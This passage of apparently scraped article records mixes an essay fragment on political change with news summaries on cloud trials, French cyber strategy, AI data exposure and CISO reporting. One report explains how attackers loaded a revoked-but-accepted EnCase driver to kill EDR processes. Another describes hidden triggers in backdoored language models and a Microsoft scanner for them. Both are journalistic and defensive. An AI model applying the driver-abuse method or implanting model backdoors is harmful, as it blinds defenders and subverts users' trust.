Parliament, who were completely convinced that Europe would never spurn the fossil fuel sector – despite the fact that it had already happened. Indeed, it may be that intimate familiarity with European politics is a liability when things change. Spend enough time observing up close how supine European politicians and their Eurocrats are and you may find yourself so reflexively conditioned to view them as spineless corporate lackeys and thus unable to notice when they finally dig up a vertebra or two. Smart financiers are familiar with Stein's Law: \"anything that can't go on forever eventually stops.\" Change happens. Eternal verities might be fifteen minutes older than you. Pink used to be the color of ferocious masculinity, whereas blue was so girly as to be practically titular: https://en.wikipedia.org/wiki/Gendered_associations_of_pink_and_blue Real talk: I have serious, debilitating chronic pain. One of the reasons I'm so prolific is that the only time I stop noticing how much I hurt is when I'm lost in work (compartmentalization is a hell of a drug, and while it's not always healthy, it has its upsides). Ask anyone with chronic pain and they'll tell you that treating pain eventually becomes your hobby, a bottomless well of esoteric dives into various \"modalities\" of pain treatment. Thus it is that I've found myself on one or two psychologists' couches, learning about different mental approaches to living with constant pain. One of the most useful pieces of advice I've gotten was to attend closely to how my pain changes – how it ebbs and flows. The point is that if pain changes, that means that it can change. It feels eternal, but it comes and goes. Maybe someday it will go altogether. And even if it doesn't, it may improve. It probably will, at least for a while. Things change. Our current crop of cowardly, weak appeasers – in Congress, in Parliament, in the European Parliament – have, at various times (and very recently), found their spines. The factions within them that militated for the kind of bold action that might meet this moment have, from time to time, won the day. We have lived through total transformations in our politics before, and that means we might live through them again: https://hypertext.niskanencenter.org/p/the-fragmentation-flywheel Sure, it's easy and tempting to assume that our leaders will always suck as hard as they suck now. But latent in that assumption is that the leaders who presided over big, incredible transformations were exceptional people. Maybe they were and maybe they weren't, but I'm here to tell you, ten minutes' worth of research into the biographies of the \"heroes\" of our history will reveal them to have been every bit as capable of monstrousness, cowardice, cruelty and pig-ignorant bigotry as any of today's rotating cast of fascist goons: https://truthout.org/articles/disrupting-the-myth-of-franklin-d-roosevelt-in-the-age-of-trump-sanders-and-clinton/ The question isn't merely \"How do we elect better leaders?\" It's \"How do we make our leaders follow us?\" Today's Democrats are unserious quislings who keep bringing a squirt-gun to a mass-casualty assault-rifle spree-shooting. How do we terrorize these cowards into rising to the moment? If we want Congressional Democrats to form a Nuremburg Caucus and start holding hearings on who they're going to put in the dock when the Trump regime collapses, we're going to have to drive them to it. And we can! The Democrats who gave us the New Deal weren't braver or more moral than the self-dealing millionaires in Congress today – they were more afraid of their base. Things change. Some years ago, I gave a speech at Consumer Reports headquarters in Poughkeepsie, trying to get them to refuse to give a passing grade to any product with DRM, on the grounds that the manufacturer could alter how that device worked at any time in the future, meaning that no matter how well a device worked now, it might turn into a pile of shit at any time in the future: https://www.soundguys.com/the-sonos-app-death-spiral-132873/ They didn't take me up on this suggestion, obviously. They made the (seemingly) reasonable point that people bought Consumer Reports to find out what to buy, not to be told that they shouldn't buy anything. Every product in many key categories came with DRM, meaning that their recommendation would have had to be \"just don't buy any of it.\" But today, consumer review sites do sometimes recommend nothing: https://www.mozillafoundation.org/en/blog/privacy-nightmare-on-wheels-every-car-brand-reviewed-by-mozilla-including-ford-volkswagen-and-toyota-flunks-privacy-test/ And of course, there's some precedent here. Somewhere between the emergence of the evidence for seatbelts and the appearance of seatbelts in most makes and models of cars, there would have been a time when the answer to \"which car should I buy?\" was \"don't buy a car, they're all unsafe at any speed.\" Things change. Today, every car has a seatbelt, and they'd continue to do so, even if we did away with regulations requiring seatbelts. Driving a car without a seatbelt would be as weird and terrible as using a radium suppository: https://pluralistic.net/2024/09/19/just-stop-putting-that-up-your-ass/#harm-reduction Things change. The nine-justice Supreme Court isn't an eternal verity. It didn't come down off a mountain on two stone tablets. It's about ten seconds old: https://en.wikipedia.org/wiki/Judiciary_Act_of_1869 Tomorrow, it will be different: https://pluralistic.net/2020/09/20/judicial-equilibria/#pack-the-court Our eternals are all ephemerals. The idea that we should tax capital gains at half the rate of wages? It was practically invented yesterday. You know who thought we should tax all income at the same rate?

Much of it is calamitous. Some of it wondrous: https://pluralistic.net/2025/06/28/mamdani/#trustbusting It's so easy to slip into the habit of thinking that nothing will change, that our politicians will never fear us more than they love the money and power they get from catering to the Epstein class. I'm not denying that this is how they view the world today, but there was a time in living memory when it wasn't true.

    "title": "Getting Started with Gemini 3: Unlocking the Cloud with the Free Trial",
    "summary": "In the previous post, we dipped our toes into the AI waters. We grabbed a Gemini API key to build your first \"Hello World\" AI app and then used the magic of Vibe Coding in Google AI Studio to create and deploy a web app to Cloud Run . But if you tried to hit that \"Deploy\" button in Part 2 without a Google Cloud Project set up, you might have hit a small speed bump. A Google Cloud Project unlocks the ability to host AI apps, store massive datasets, and yes, unleashes the full range of the Gemini Pro models such as Nano Banana Pro (Gemini 3 Pro Image) . The good news? It’s free to start, and provides you a stash of credits to play with. In this post, we’ll walk through exactly how to sign up for the Google Cloud Free Trial and, more importantly, what you actually receive. Why do I need a Cloud Account? Google AI Studio is fantastic for prototyping and experimenting, while also allowing you to deploy applications directly to Cloud Run. Nevertheless as your application grows, you may want to leverage the broader Google Cloud ecosystem to scale and manage your solution. Examples of available services include: Hosting : You want your AI app to live on a URL that doesn't expire. Storage : You need a place to store and query user and application data, or images / files. Compute : You might need a background worker or a virtual machine. Global scale : You can deploy your solution across multiple regions to ensure high availability and low latency for users everywhere. This is where the Google Cloud comes in. It’s the same infrastructure that powers Google Search and YouTube , and you can use it for your own projects. What do you get for free? Before we sign up, let’s look at what’s in the box. The Google Cloud free offer has two parts: The $300 Credit (The Free Trial) - new customers get $300 in free credits to use over 91 days. You can spend this on various Google Cloud products . The Google Cloud Free Tier - this is the developer's best friend. Even after your trial ends, many services have generous free usage limits that renew every month. As long as you stay within these limits, you incur no charges. Some highlights of the Free Tier include: Cloud Run : 2 million invocations per month (perfect for the app we built in Part 2 ). Compute Engine : 1 non-preemptible e2-micro VM instance per month (in specific US regions). Cloud Storage : 5 GB-months of regional storage (US regions only) per month. BigQuery : 1 TiB of querying and 10 GiB of storage per month. And many more… Note: Always check the official Free Tier documentation for the most up-to-date limits and region specifics. Step-by-Step: Signing Up You're eligible for the Free Trial when both of the following are true: You've never been a paying user of Google Cloud, Google Maps Platform, or Firebase. You haven't previously signed up for the Free Trial. Ready to claim your credits? Follow these steps: Step 1 - Get started Navigate to cloud.google.com/free . You should see a button that says \"Start Free\" or \"Get Started for Free\". Note: If you don’t see the ‘Get starter for Free’ button you most likely have activated the Cloud account in the past, but should still be able to leverage the Free Tier. Step 2 - Sign in Sign in using your Google Account (gmail). This can be the same account you used for Google AI Studio. Note: If you see a message saying “You may already have a Google Account yourname@gmail.com. Cancel to create a new account using an email address from a different provider.”, please click ‘Sign in’ to continue. Step 3 - Accept Terms of Service Select your country. This determines the currency and specific terms of service. You'll need to agree to the Terms of Service to proceed. Note: You may also choose to receive periodic emails and special offers, but it’s completely up to you. Step 4 - Identity verification This is the part where some new users hesitate, so let’s be clear: Google asks for a credit card or payment method to verify your identity and prevent potential fraud. No Auto-Charge: You are not automatically charged when your free trial ends . You have to manually upgrade to a paid account to continue using resources beyond the free trial. The card might be used to verify your bank account before being awarded the Free Credits and the exact method may differ from region to region. To continue you need to provide contact information and a payment method. Step 5: Start Building Once verified, your console will load, and you’ll see your $300 Free trial credit balance in the top banner and in the “Billing Accounts” section. You typically start with a default project (e.g., \"My First Project\") and you can create a new one. Note: The amount of credit remaining may be displayed in your local currency. Connecting back to AI Studio Now that you have a billing-enabled project, you can go back to Google AI Studio and use it with Nano Banana Pro when asked for a Paid API Key. Import the new Project to Google AI Studio Create a new API Key Connected with the Newly Imported Project Call Nano Banana Pro with the New API Key What's Next? You have $300 in credits and a powerful cloud platform at your fingertips. But what should you actually build? In the next post, we’ll show you a couple examples of utilising them to build next generation AI applications and Agents. In the meantime I encourage you to explore our extensive codelabs library and start building your next idea!",

    "title": "Attackers exploit decade‑old Windows driver flaw to shut down modern EDR defenses",
    "summary": "In a recent incident, attackers abused a legitimate but vulnerable Windows kernel driver to shut down endpoint security tools during an ongoing incident response. According to a Huntress report, the activity was observed during a customer investigation in early 2026 and involved the use of an old EnCase forensic driver (by Guidance Software) as part of the Bring Your Own Vulnerable Driver ( BYOVD ) technique to terminate Endpoint Detection and Response ( EDR ) processes from kernel mode. The intrusion began with compromised SonicWall SSL VPN credentials, after which the attacker conducted internal reconnaissance and deployed a custom “EDR killer” binary. “The attack was disrupted before ransomware deployment, but the case highlights a growing trend: threat actors weaponizing signed, legitimate drivers to blind endpoint security,” Huntress researchers said in a blog post. “The EnCase driver’s certificate expired in 2010 and was subsequently revoked, yet Windows still loads it, a gap in Driver Signature Enforcement that attackers continue to exploit.” Microsoft did not immediately respond to CSO’s request for comments. The BYOVD abuse According to the researchers, the attack used a common technique of abusing a legitimate signed driver that already has kernel-level privileges. This gave the attackers direct, high-privilege access to the kernel, effectively allowing them to terminate almost any process they want, including security tooling. Windows’ Driver Signature Enforcement, the policy requiring all kernel-mode drivers to be digitally signed by a trusted Certificate Authority (CA), doesn’t check certificate revocation lists at kernel load time. Researchers noted this to be a legacy behavior that remains exploitable because of backward compatibility features introduced years ago that allow an exception for drivers signed with certificates issued before July 29, 2015, that chain to a supported cross-signed CA. The EnCase driver contains a timestamp from a VeriSign service, which the authentication check still considers valid. “When code is signed with a timestamp, Windows validates the signature against the time the signature was created, not the current date,” the researchers noted. “Because the driver was timestamped while the certificate was still valid ( before January 31, 2010 ), the signature remains valid indefinitely, even though the certificate has since expired.” Once in the kernel, the driver exposes an IOCTL interface that lets the malware terminate arbitrary processes with full system privileges. Among the functionality exposed are process termination commands that bypass user-mode safeguards for Protected Process Light (PPL) processes, the defenses EDR systems depend on to avoid tampering. The kill list excluded Huntress The EDR killer binary used in the Huntress-observed attack packed a 64-bit Windows executable and a custom encoded kernel driver payload, which it decoded into OemHwUpd.sys and installed as a kernel-mode service. Because Windows still honors its cryptographic signature, the attackers were able to load the driver. Once the vulnerable driver was in place, the EDR killer compiled an internal list of 59 well-known security tool processes, hashing their names and continuously checking for their presence on the system. “The kill loop runs continuously with a 1-second sleep interval, ensuring any security process that restarts is immediately terminated again,” the researchers said. Incidentally, Huntress said it wasn’t on the kill list. “While the EDR killer targets nearly every major EDR and AV vendor on the market, the Huntress agent was not among the 59 processes targeted for termination,” it added. Once the driver was written to disk, the binary established persistence by registering it as a Windows kernel service. Huntress recommended enabling Microsoft’s Vulnerable Driver Blocklist on all supported Windows systems to prevent known abused drivers from loading. The researchers also advised enforcing strong access controls on remote access services, including MFA for VPNs such as SonicWall, and closely monitoring for suspicious driver installation activity. Where possible, organizations are also encouraged to enable virtualization-based security features like Hypervisor-protected Code Integrity (HVCI) to further restrict kernel-mode abuse.",

    "title": "France’s Cybersecurity Roadmap: Talent, Deterrence, and European Digital Sovereignty",
    "summary": "Introduction France has released its National Cybersecurity Strategy for 2026-2030, and the document reveals an ambitious vision that extends far beyond traditional defense postures. Under the directive of President Emmanuel Macron, who frames cybersecurity as \"a prerequisite for freedom\" and \"a strategic imperative,\" France is positioning itself not merely as a secure nation, but as Europe's cybersecurity powerhouse. The strategy's structure is telling. While most national cybersecurity frameworks lead with infrastructure protection or threat response, France places talent development as Pillar 1—the foundational priority before all others. This sequencing isn't accidental. It signals a fundamental recognition that sustainable cybersecurity advantage isn't built on technology alone, but on the human capital capable of wielding it. Pillar 1: Building Europe's Largest Cyber Talent Pool France's most ambitious commitment is becoming \"the largest pool of cyber talent in Europe,\" backed by initiatives addressing the global cybersecurity labor shortage at its roots. The strategy confronts persistent barriers directly: the perception of cybersecurity as \"male-dominated, solitary, essentially technical, and accessible only to those with high education.\" The approach spans the entire talent pipeline. Mentoring programs will target young women. Cybersecurity will integrate into civic engagement programs for youth. A national platform will coordinate public and private efforts guiding people toward cyber careers. MOOCs and self-training tools will democratize access to cybersecurity knowledge. Most notably, France commits to \"bridge strategies\" between cyber and non-cyber scientific disciplines—recognizing that tomorrow's challenges require expertise spanning AI, quantum computing, cryptography, and emerging domains. At the European level, France will champion harmonized training courses across all EU member states and promote professional mobility, establishing itself as the gravitational center of European cyber talent development. Pillar 2: National Resilience Through Proportionate Protection France's second pillar acknowledges that cyber threats \"affect all sectors of the economy and society,\" requiring resilience extending beyond government to encompass the entire economic and social fabric. The framework operates on proportionate principles: vital services receive the highest protection capable of withstanding sophisticated threats, while broader entities face cybersecurity obligations aligned with the European NIS2 Directive. Beyond mandatory requirements, a trust label system will allow businesses, local authorities, and associations to demonstrate security efforts to stakeholders, creating market incentives for voluntary investment. A national portal for everyday cybersecurity will provide a single access point for information and resources, while the 17Cyber platform will function as a public service desk for incident victims. Critically, France commits to national cyber crisis exercises testing coordination and response efficiency at territorial, sectoral, national, European, and international levels—ensuring resilience isn't merely documented but operationally validated. Pillar 3: Multi-Lever Deterrence France explicitly states its determination \"to halt the expansion of this cyber threat\" by mobilizing judicial, technical, diplomatic, military, and economic instruments to \"increase the financial, human and reputational cost for potential adversaries.\" The Cyber Crisis Coordination Centre (C4) brings together ANSSI, COMCYBER, and intelligence services DGSE and DGSI. Its mandate will expand to activate broader response measures and propose options to political authorities—including public attribution of attacks. France will coordinate with European partners in implementing the EU's cyber-diplomatic toolbox, particularly its sanctions regime. Uniquely, France will mobilize private sector participation in national cyber defense. Internet operators will implement protective measures to detect, characterize, and potentially block attacks early. A cybersecurity filter will prevent public access to malicious websites. Technical threat information sharing between government and private actors will strengthen through InterCERT France. Pillar 4: Technological Sovereignty and Industrial Consolidation France's fourth pillar addresses dependence on digital technologies potentially controlled by foreign entities or vulnerable to sophisticated attacks. The approach centers on maintaining \"autonomy of judgement and freedom of action in cyberspace\" through sustained mastery of critical technologies and autonomous assessment capabilities. Investment focuses on critical cryptography technologies and products capable of countering advanced threats for sovereign uses. Industrial policy instruments will stimulate European sector consolidation, supporting the emergence of world-leading cyber industrial players. France will leverage European funds and private partnerships to drive investment in world-class companies, including specialized investment funds. The European certification framework for cybersecurity products and services will structure this industrial development. France will also continue developing its internationally recognized security evaluation sector while promoting autonomous European evaluation capability. Pillar 5: International Cooperation Without Geopolitical Blocs France's fifth pillar promotes cyberspace security and stability while explicitly rejecting \"the logic of geopolitical blocs.\" The governance approach combines multilateral frameworks with multi-stakeholder participation—states, private sector, research, and civil society. France will continue leading initiatives like the Paris Call (over 1,200 stakeholders around nine principles for open, secure cyberspace) and the Pall Mall Process addressing commercial cyber intrusion capability proliferation (27 governments endorsed its code of best practices by August 2025). Within the UN, France supports establishing a Global Cybersecurity Mechanism by 2026 to operationalize 2015 UN standards of responsible behavior. At the European level, France regards the EU as \"essential and preferred\" for safeguarding its cyberspace initiative and action. France will strengthen EU strategic autonomy through full involvement in cooperation forums like the CSIRT Network, CyCLONe, and CYBERCO, emphasizing threat information sharing to achieve greater European autonomy. France will also develop cyber solidarity capabilities through structural cooperation (long-term capacity building via advice, training, logistical support) and operational cooperation (specific assistance through IT audits and incident response). The EU Cyber Reserve, operational by 2026, will deploy incident response services from trusted private providers to help EU member states and associated third countries. The Distinctive Governance Model France's organizational approach explicitly separates defensive and offensive cyber missions while ensuring effective coordination—guaranteeing civil liberties while maintaining operational effectiveness. Defensive governance operates across three missions: \"The State defends the Nation\" (understanding threats and developing responses), \"The State secures itself\" (protecting state systems and critical operators), and \"The Nation strengthens itself\" (coordinating public action and private efforts across individuals, businesses, associations, and local authorities). This multi-stakeholder governance integrates professional sectors, local government, academia, and civil society as both victims and essential partners in response development—recognizing cyber threats affect all areas of society, economy, and national territory. Strategic Implications France's strategy arrives amid heightened geopolitical tension, explicitly acknowledging Russia's war in Ukraine and the \"increasingly fragmented world.\" The emphasis on deterrence, technological sovereignty, and European cooperation reflects assessment that cybersecurity has become inseparable from national sovereignty and international power dynamics. The talent development prioritization deserves particular attention. While other nations focus primarily on defensive capabilities and threat response, France recognizes sustainable advantage requires building human infrastructure capable of continuous innovation. Becoming Europe's largest cyber talent pool isn't subsidiary to technical capabilities—it's the foundation enabling all other strategic objectives. The European dimension permeates every pillar. France consistently frames cybersecurity advancement as contribution to European strategic autonomy rather than purely national capability, positioning itself as architect and leader of European cyber policy. The timeline extending to 2030 provides sufficient horizon for structural changes in talent pipelines, industrial capabilities, and international frameworks to materialize—allowing investments whose benefits compound over time. From Vision to Execution Implementation challenges are substantial. Talent development initiatives require long-term cultural shifts that educational programs alone cannot achieve—industry must provide accessible entry points, competitive compensation, and inclusive workplace cultures. The deterrence posture requires careful calibration to avoid escalation while maintaining credibility. The multi-stakeholder governance demands coordination across fragmented communities with divergent interests. For organizations observing France's strategic evolution, implications extend beyond French borders. European cooperation, standardization, and industrial consolidation will shape the continental cybersecurity market. Talent pipeline investments will affect where expertise concentrates. Regulatory frameworks aligned with NIS2 will establish compliance baselines affecting multinational operations. France's 2026-2030 National Cybersecurity Strategy represents one of the most comprehensive national frameworks released by any country. Its success depends not just on French execution, but on European coordination, private sector engagement, and the broader international community's response to the governance models and cooperation frameworks France promotes. Strengthening Organizational Resilience As nations like France invest in comprehensive cybersecurity strategies emphasizing talent, deterrence, and digital sovereignty, organizations worldwide face similar imperatives at the enterprise level. Building resilience requires understanding attack surfaces, monitoring threats across surface and dark web channels, and maintaining continuous visibility over evolving risks. Cyble's threat intelligence platform provides capabilities aligned to these strategic priorities—from attack surface management and dark web monitoring to vulnerability intelligence and incident response support.

    "title": "The silent security gap in enterprise AI adoption",
    "summary": "Most security leaders believe they know where their sensitive data lives and how it is protected. That confidence is increasingly misplaced. As enterprises deploy AI across customer support, software development, legal analysis and internal operations, a new data exposure surface has quietly emerged. It does not sit in databases, file systems or network links. It lives inside AI inference traffic an area that falls outside most traditional security models and visibility frameworks, as InfoWorld explains in its analysis of why AI is all about inference now . This shift has happened quickly. In many organizations, AI systems have moved from pilot projects to core infrastructure in less than two years. Yet security architectures have not evolved at the same pace. The result is a widening gap between where sensitive data actually flows and where security teams are looking. This gap is rapidly becoming one of the most overlooked security risks in modern enterprise environments. AI prompts are high-value targets AI prompts are often dismissed as transient inputs temporary strings of text that exist only for the duration of a request. In reality, they frequently contain some of the most sensitive data an organization possesses: Proprietary source code and internal tooling Confidential documents and legal contracts Customer PII and financial records Strategic workflows and decision logic Recent industry analysis shows that enterprises are increasingly feeding sensitive proprietary data into generative AI systems to improve relevance and accuracy, particularly as organizations work to unlock internal data layers for AI-driven applications. InfoWorld has documented this trend in its discussion of getting the enterprise data layer unstuck for AI . From a business perspective, this makes sense. AI systems perform best when they are grounded in real organizational knowledge. From a security perspective, however, it represents a fundamental change in how sensitive data is handled. Information that was once confined to controlled repositories is now being copied, transformed and transmitted as part of inference requests. Unlike traditional data flows, prompts are rarely classified, sanitized or monitored. They pass through application layers, middleware, logging systems, observability pipelines and third-party services with minimal scrutiny. In many cases, they are treated as operational exhaust rather than as high-value data. This creates a dangerous mismatch: some of the most sensitive data in the organization is flowing through one of the least protected pipelines. Why existing controls fall short Traditional security architectures were not designed for AI workloads, and the limitations become clear at the inference layer. Encryption protects data only until it is decrypted for processing. At that point, prompts may be exposed to application memory, runtime environments, debugging tools, observability platforms and administrative access. While transport encryption remains essential, it does little to reduce exposure once data reaches the systems that actually perform inference. Data loss prevention tools also struggle in this context. Legacy DLP solutions were built around structured data, well-defined patterns and predictable storage locations. AI prompts are dynamic, unstructured and context dependent. As a result, DLP tools often lack the semantic understanding needed to determine whether a prompt contains sensitive material or whether its use is appropriate. These limitations are well documented in discussions around why legacy DLP approaches fall short in modern data security environments . Logging and observability introduce another layer of risk. To troubleshoot AI systems, teams often log prompts, responses and intermediate states. These logs are then shipped to centralized platforms, retained for long periods and accessed by broad groups of engineers. What begins as a debugging convenience can quickly become a repository of sensitive data stored far outside its original security perimeter. In many environments, trust effectively stops at the API gateway. Beyond that boundary, AI inference traffic is implicitly trusted, even though it frequently crosses internal and external trust zones. This implicit trust model may have worked for traditional application architectures, but it is poorly suited to AI systems that blur the line between user input, internal data and external services. Internal risk is the bigger threat While external attackers remain a concern, internal exposure is often the more likely and less visible risk. Over-permissioned service accounts, misconfigured logging pipelines, compromised credentials or legitimate insider access can all result in silent prompt leakage. Unlike traditional breaches, these exposures do not require exploitation of vulnerabilities. They occur as a byproduct of normal operations in complex environments. AI systems exacerbate this risk because of their scale and frequency of use. A single application may generate thousands or millions of inference requests per day, each potentially containing sensitive data. Within that volume, misuse or accidental exposure can easily blend into normal traffic patterns. Research into insider risk consistently shows that accidental exposure is far more common than malicious breach, particularly in cloud environments where ownership and responsibility are distributed across teams. AI systems add yet another layer of complexity, making it harder to answer basic questions about who can access inference data, where it is stored and how long it is retained. Because AI usage is frequent and expected, abnormal access patterns may not trigger alarms. This makes AI inference an ideal low noise channel for data exposure one that does not resemble traditional indicators of compromise and is therefore difficult to detect with existing tools. The quantum time bomb Beyond immediate exposure, there is a longer term risk that security leaders can no longer afford to treat as theoretical: cryptographic durability. AI prompts and responses often contain data that must remain confidential for many years source code that underpins competitive advantage, customer records subject to regulatory protection, proprietary processes and strategic decisions. Yet much of today’s AI inference traffic is protected using cryptographic methods designed primarily for short-term transport security, not long term confidentiality. This distinction matters. Advances in quantum computing threaten to weaken many of the cryptographic algorithms currently used to protect data in transit and at rest. While large-scale, fault-tolerant quantum computers are not yet widely available, the associated risk is already present. Adversaries can capture encrypted data today and decrypt it later, once cryptographic assumptions fail. Security agencies and standards bodies have explicitly warned about these “harvest now, decrypt later” threats. The National Institute of Standards and Technology has highlighted the need to assess which data assets require long-term protection in its post-quantum cryptography guidance . AI significantly expands the volume of data that may fall into this category. Inference traffic often includes rich contextual information that would be highly valuable if decrypted in the future. Unlike traditional records, this data is frequently generated at scale and retained in logs, analytics systems or backups without clear lifecycle controls. For regulated industries with long data-retention requirements such as finance, healthcare and critical infrastructure this creates a silent exposure window that extends far beyond current compliance cycles. Organizations may be meeting today’s regulatory requirements while unintentionally accumulating long-term cryptographic risk. AI has unintentionally expanded not just the amount of sensitive data in motion, but the amount of data that must remain secure well into a post-quantum future often without organizations realizing it. The bottom line for security leaders This gap exists not because teams are careless, but because AI inference does not fit cleanly into existing security models. It crosses trust boundaries that were never designed with AI in mind and introduces data flows that traditional controls were never built to govern. As AI becomes embedded in core enterprise workflows, the security implications of inference traffic can no longer be treated as an edge case. They represent a fundamental shift in how sensitive data is created, processed and exposed. This is not a call for a specific solution, but a problem the industry can no longer afford to ignore.

    "title": "Microsoft develops a new scanner to detect hidden backdoors in LLMs",
    "summary": "Microsoft has developed a scanner designed to detect backdoors in open-weight AI models, addressing a critical blind spot for enterprises increasingly dependent on third-party LLMs. In a blog post , the company said its research focused on identifying hidden triggers and malicious behaviors embedded during the training or fine-tuning of language models, which can remain dormant until activated by specific inputs. Such backdoors can allow attackers to alter model behavior in subtle ways that enable data exposure or allow malicious activity to slip past traditional security controls unnoticed. As enterprises increasingly rely on third-party and open-source models for applications ranging from customer support to security operations, the integrity of those models is under scrutiny. “Unlike traditional software, where scanners look for coding mistakes or known vulnerabilities, AI risks can include hidden behavior planted inside a model,” said Sunil Varkey , a cybersecurity analyst. “A model may work normally but respond in harmful ways when it sees a secret trigger.” That risk is more concerning because LLMs can be deployed without deep inspection, leaving security teams with limited visibility into their training or vulnerabilities. Signatures that suggest backdoors Microsoft’s researchers identified three observable indicators, or “signatures,” that suggest the presence of backdoors in language models. One of the strongest indicators is a shift in how a model pays attention to a prompt when a hidden trigger is present. In backdoored models, trigger tokens tend to dominate the model’s attention, effectively overriding the rest of the input. “We find that trigger tokens tend to ‘hijack’ the attention of backdoored models, creating a distinctive double triangle pattern,” Microsoft said. The researchers also found that backdoored models may leak information about how they were poisoned. In some cases, specific prompts caused models to regurgitate fragments of the very training data used to insert the backdoor, including parts of the trigger itself. Another key finding is that language model backdoors behave differently from traditional software backdoors. Rather than responding only to an exact trigger string, many backdoored models react to partial or approximate versions of the trigger. Effectiveness of the scanner Microsoft said the scanner does not require retraining models or prior knowledge of backdoor behavior and operates using forward passes only, avoiding gradient calculations or backpropagation to keep computing costs low. The company also said it works with most causal, GPT-style language models and can be used across a wide range of deployments. Analysts say that while the approach improves visibility into language model poisoning, it is an incremental advance rather than a breakthrough, noting that several leading EDR platforms already claim the ability to detect backdoors in open-weight LLMs. The bigger question is how long such detection advantages will last. “While this new scanner will help counter real-world attacker techniques currently, adversaries will adapt quickly to outflank this scanner,” said Keith Prabhu , founder and CEO of Confidis. “We are seeing a repeat of the ‘virus’ wars, where hackers kept evolving viruses to evade detection by using innovative techniques like polymorphic viruses.” That said, the scanner is essential for companies that download open-source models to use or customize in their own systems, according to Varkey. “For them, AI models become part of the supply chain, just like software libraries,” Varkey said. “The scanner is not a complete solution, but it is an important new layer of protection as AI adoption grows.”",

    "title": "Building trust with the board through evidence-based proof",
    "summary": "Cybersecurity is a boardroom issue, but meaningful dialogue often breaks down at the table. Boards ask about cybersecurity investments and cyber resilience; they need answers rooted in reality, not prognostication. When cybersecurity leaders respond with a list of technologies deployed and potential risks that require additional investment, board members may get frustrated by a lack of clear answers and lose trust. This is a great opportunity for CISOs to take a different approach. Part of the challenge is that most boards don’t have cybersecurity practitioners and expertise, making it challenging to understand the linkage between technical risks and business impact. It’s the responsibility of the CISO to translate technical cybersecurity outcomes into business terms that enable board members to make well-informed decisions on future investments and financial protection for the business. Additionally, senior leadership teams need to be prepared to discuss concepts like risk appetite and potential degrees of business interruption. That’s because no amount of cybersecurity investment can guarantee zero disruptions; a certain amount of risk must be accepted. Unfortunately, this unintentional communication gap comes with the nature of cyber threats. The board wants to know how well-positioned the company is to avoid costly business interruptions, regulatory penalties or class action lawsuits from cyber incidents. It’s tempting to rely on internal audits and regulatory compliance (such as SOC2 attestations), but these don’t provide a robust answer to cyber resilience: many companies have failed to stop cyberattacks despite extensive investments in cybersecurity tools and compliance. (In fact, Gartner predicts worldwide end-user spending on information security will reach $240 billion in 2026) Cybersecurity leaders desperately need to prove the performance of cybersecurity investments and demonstrate confidently and with evidence that safeguards are working as intended all the time. There’s an obvious opportunity to change the conversation with boards and senior leadership teams. Why trust fails: The limits of compliance and communication Cybersecurity frameworks like NIST and CSF — and complying with these frameworks — are key. However, while they were designed to standardize and validate an acceptable level of controls, they don’t guarantee positive cybersecurity outcomes. Passing an audit once a year doesn’t mean your controls work every day. For instance, a misconfigured control can create direct breach exposure. A backup gap might break your recovery time objective (RTO) promise. A missing insurance requirement at the time of an attack could void coverage. It’s tempting for CISOs to present heatmaps and dashboards that are too technical for board members. When executives ask why something is red, the conversation may wander into what seems to the board like subjectivity. The Securities and Exchange Commission (SEC) cybersecurity disclosure requirements have forced boards to engage. New rules have increased visibility and consequences for both boards and CISOs without necessarily improving fluency. CISOs are accountable but still lack the means to prove the outcome of their team’s work. Bridging the language gap between cybersecurity leaders and business requires translation, but it’s also an opportunity to redefine the role of cybersecurity and focus on the desired outcome sought after by business leaders: cyber resilience. Building a common language to get to “Here’s the proof of cyber resilience” CISOs can reframe the discussion using data and evidence. Modern cybersecurity tools produce a large volume of data and information on how they operate at any point in time, the status of controls deployed, the validation of configuration and more. There’s an opportunity to collect such data, sanitize it and derive continuous insights that validate, at any point in time, not just compliance with cybersecurity regulations but also overall cybersecurity posture. Because these insights are proof of actual state, the CISO can illuminate gaps in protection on an ongoing basis and either address these gaps or help the business determine mitigation priorities. And in some cases, a perfectly appropriate business decision is to accept a risk. It’s important to capture that acceptance formally, document why it was accepted and ensure that the acceptance is reviewed on an appropriate cadence so the level of risk over time doesn’t outpace a company’s appetite. This will remove subjectivity and confusion from board reports. CISOs can show proof of readiness and effectiveness, and boards can interpret results in familiar business terms. Practical steps for CISOs to prove resilience Cybersecurity deployment is critical, but insufficient. Every day, even organizations with robust cybersecurity investments fall victim to cyber attacks. Board and business leaders put the burden on cybersecurity leaders, but actually demand more: they want cyber resilience. Cyber resilience is the ability to continue critical operations under degraded circumstances, like a cyber incident, and the agility to return to normal operations quickly and with minimal financial impact. It’s more than the deployment of cybersecurity tools. Backups must be recoverable, and cyber insurance policies need to pay claims. Ideally, the organization knows how long it takes to restart systems from backup and has all information at hand for claims to be paid fully and quickly. Today, no single role owns cyber resilience, but different aspects are the purview of the CISO (safeguards), the CIO (backups) and the CFO (insurance). Collaboration between all three is required to assess that all safeguards are in place. It’s also time to upgrade manual tracking of safeguards to evidence-based, automated tracking. The next step is to shift from activity reporting to evidence sharing and decision support. This includes providing a clear view of the state of cybersecurity, which then surfaces risks that the business needs to make decisions on in terms of whether to mitigate or accept. To use evidence to demonstrate whether the business is meeting its goals for cyber resilience, data must replace prediction. Next, automate low-value work. Free teams from repetitive audit preparation by using tools to aggregate and provide tamper-proof evidence. Focus human expertise on strategy and decision-making for cyber resilience instead of administrative tasks. Finally, educate and contextualize for the board. Deliver short, outcome-focused updates that tie cybersecurity performance to cyber resilience goals. Reinforce the point that business risk and continuity ultimately reside with the board, not the CISO. Better language, stronger trust Cyber resilience is a business problem, not an IT and cybersecurity problem. The board will understand it when evidence-driven communication fosters transparency, trust and clarity of action. As they hear information relayed in language they can understand, boards gain confidence in investments and governance decisions. This results in fewer redlines on board reports, more meaningful conversations and longer CISO tenures. It moves cybersecurity from a reactive cost center to a proactive value driver. When CISOs can show proof tailored to the company’s own risk tolerance, the conversation changes from uncertainty to clarity.

    "title": "Agent Factory Recap: Build an AI Workforce with Gemini 3",
